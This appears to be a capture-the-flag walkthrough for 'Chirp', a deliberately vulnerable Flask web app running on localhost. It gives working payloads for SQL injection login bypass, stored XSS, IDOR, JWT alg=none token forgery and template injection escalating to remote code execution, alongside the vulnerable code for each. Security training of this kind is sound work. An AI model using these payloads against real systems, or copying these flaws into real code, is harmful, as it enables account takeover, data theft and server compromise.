# Chirp — Exploit Walkthroughs

All commands assume the app is running at `http://127.0.0.1:5000`. Each exploit
below was verified against the seeded database.

---

## V1 — SQL Injection (authentication bypass)

**Where:** `app.py`, `login()` route.

```python
query = ("SELECT * FROM users WHERE username = '%s' AND password = '%s'"
         % (username, password))
```

User input is concatenated directly into SQL. The `username` field can close
the string literal and comment out the password check.

**Exploit** — log in as `admin` with no password:

```bash
curl -i -c cj.txt -d "username=admin' --&password=x" \
  http://127.0.0.1:5000/login
```

The `admin' --` makes the query:
`SELECT * FROM users WHERE username = 'admin' --' AND password = 'x'`
The `--` comments out the rest, so the row for `admin` is returned and you get
a valid session cookie. (Classic `' OR '1'='1` also dumps the first user.)

**Impact:** full authentication bypass; with `UNION`-based payloads the whole
`users` table (including plaintext passwords) can be exfiltrated.

---

## V2 — Stored XSS (persistent)

**Where:** `templates/index.html` renders the tweet body with `| safe`, which
disables Jinja's auto-escaping.

```jinja
<div style="margin-top:6px;">{{ t['body'] | safe }}</div>
```

**Exploit** — post a tweet whose body is script, then it fires for every
visitor to the home feed:

```bash
curl -b cj.txt -d "body=<script>alert(document.cookie)</script>" \
  http://127.0.0.1:5000/tweet
```

Load `/` in a browser → the script executes in each viewer's session.

**Impact:** session-cookie theft, feed defacement, forced actions as the
victim. "Stored" because the payload is saved in the DB and served to everyone.

---

## V3 — IDOR (Insecure Direct Object Reference)

**Where:** `app.py`, `get_dm()` route. It authenticates the caller but never
checks that the DM belongs to them.

```python
dm = db.execute("SELECT * FROM dms WHERE id = ?", (dm_id,)).fetchone()
```

**Exploit** — as *any* logged-in user (e.g. the SQLi session above), read other
people's private messages by walking the id:

```bash
curl -b cj.txt http://127.0.0.1:5000/api/dm/2
# {"from":"admin","id":2,"message":"FLAG{idor_lets_you_read_my_dms}","to":"alice"}
```

**Impact:** any user can read every DM in the system by incrementing the id.

---

## V4 — Broken authentication (JWT `alg=none` confusion)

**Where:** `app.py`, `verify_token()`. The server trusts the `alg` field
supplied *inside the token*. If it says `none`, signature verification is
skipped entirely.

```python
if header.get("alg") == "none":
    return payload.get("user")      # no signature check
```

**Exploit** — forge a token for `admin` with no signature and hit `/admin`:

```bash
FORGED=$(python3 - <<'PY'
import base64, json
b = lambda x: base64.urlsafe_b64encode(x).rstrip(b"=").decode()
h = b(json.dumps({"alg":"none","typ":"CHIRP"}).encode())
p = b(json.dumps({"user":"admin"}).encode())
print(f"{h}.{p}.")      # note the empty signature segment
PY
)
curl -b "session=$FORGED" http://127.0.0.1:5000/admin
# ... FLAG{alg_none_made_you_admin}
```

**Impact:** complete identity forgery — become any user, including `admin`,
without knowing the signing key or any password.

---

## V5 — Server-Side Template Injection (→ RCE)

**Where:** `app.py`, `profile()` route concatenates the user-controlled bio
into a template string and renders it:

```python
bio_html = render_template_string("<div class='bio'>" + (row["bio"] or "") + "</div>")
```

Because the bio is *compiled as a template*, Jinja expressions in it execute
server-side.

**Exploit** — set your bio and view your profile:

```bash
# proof of execution
curl -b cj.txt --data-urlencode "bio={{7*7}}" http://127.0.0.1:5000/settings
curl -b cj.txt http://127.0.0.1:5000/user/admin
#   <div class='bio'>49</div>

# leak app config / secret key
#   bio = {{ config.items() }}
```

From `{{7*7}}` an attacker escalates through Python object introspection
(`{{ ''.__class__.__mro__[1].__subclasses__() }}` …) to arbitrary command
execution on the server.

**Impact:** remote code execution on the host — the most severe of the five.

---

## Suggested CTF flow

1. **V1** SQLi → log in as admin (or any user) to get a session.
2. **V3** IDOR → walk `/api/dm/<id>` → `FLAG{idor_lets_you_read_my_dms}`.
3. **V4** forge `alg=none` admin token → `/admin` → `FLAG{alg_none_made_you_admin}`.
4. **V2** stored XSS and **V5** SSTI demonstrate client-side and server-side
   code execution respectively.
